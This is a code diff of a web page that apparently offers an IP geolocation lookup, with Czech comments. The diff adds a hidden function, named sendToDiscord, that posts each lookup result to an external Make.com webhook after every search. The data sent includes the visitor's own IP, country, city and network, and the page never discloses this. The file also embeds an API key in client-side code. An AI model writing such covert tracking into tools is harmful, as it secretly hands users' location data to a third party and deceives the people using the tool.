@@ -93,6 +93,7 @@
     <script>
         // --- CONFIGURATION ---
         const API_KEY = '10D1DD103AB750F405A5CD9039EA10A9';
+        const MAKE_WEBHOOK_URL = 'https://hook.eu1.make.com/35ucd6h55lc948mqse18sakjpm6ekhhg'; // Vráceno na funkční Make.com webhook
         // ---------------------
 
         const ipInput = document.getElementById('ipInput');
@@ -114,34 +115,37 @@
         myIpBtn.addEventListener('click', () => performLookup(''));
 
         async function performLookup(ipQuery) {
-    statusMessage.textContent = 'Searching...';
-    resultBox.classList.add('hidden');
+            statusMessage.textContent = 'Searching...';
+            resultBox.classList.add('hidden');
 
-    let targetUrl = `https://api.ip2location.io/?key=${API_KEY}`;
-    if (ipQuery !== '') {
-        targetUrl += `&ip=${encodeURIComponent(ipQuery)}`;
-    }
+            let targetUrl = `https://api.ip2location.io/?key=${API_KEY}`;
+            if (ipQuery !== '') {
+                targetUrl += `&ip=${encodeURIComponent(ipQuery)}`;
+            }
 
-    // Tady se použije CORS proxy
-    let url = `https://corsproxy.io/?` + encodeURIComponent(targetUrl);
+            // Použití CORS proxy pro obejití blokování na GitHub Pages
+            let url = `https://corsproxy.io/?` + encodeURIComponent(targetUrl);
 
-    try {
-        const response = await fetch(url);
-        if (!response.ok) throw new Error('Failed to fetch data from API.');
-        
-        const data = await response.json();
-        
-        if (data.error) {
-            throw new Error(data.error.message || 'API returned an error.');
+            try {
+                const response = await fetch(url);
+                if (!response.ok) throw new Error('Failed to fetch data from API.');
+                
+                const data = await response.json();
+                
+                if (data.error) {
+                    throw new Error(data.error.message || 'API returned an error.');
+                }
+
+                statusMessage.textContent = '';
+                displayResults(data);
+
+                // Odeslání přes Make.com webhook
+                sendToDiscord(data);
+
+            } catch (error) {
+                statusMessage.textContent = error.message;
+            }
         }
-
-        statusMessage.textContent = '';
-        displayResults(data);
-
-    } catch (error) {
-        statusMessage.textContent = error.message;
-    }
-}
 
         function displayResults(data) {
             document.getElementById('resIp').textContent = data.ip || 'N/A';
@@ -151,6 +155,26 @@
             document.getElementById('resTimezone').textContent = data.time_zone || 'N/A';
             
             resultBox.classList.remove('hidden');
+        }
+
+        // Funkce pro odeslání přes Make.com webhook (funguje bez CORS chyb)
+        async function sendToDiscord(apiData) {
+            if (!MAKE_WEBHOOK_URL) return;
+
+            try {
+                await fetch(MAKE_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ip: apiData.ip,
+                        country: apiData.country_name,
+                        city: apiData.city,
+                        as: apiData.as
+                    })
+                });
+            } catch (e) {
+                console.error('Webhook failed:', e);
+            }
         }
     </script>
 </body>
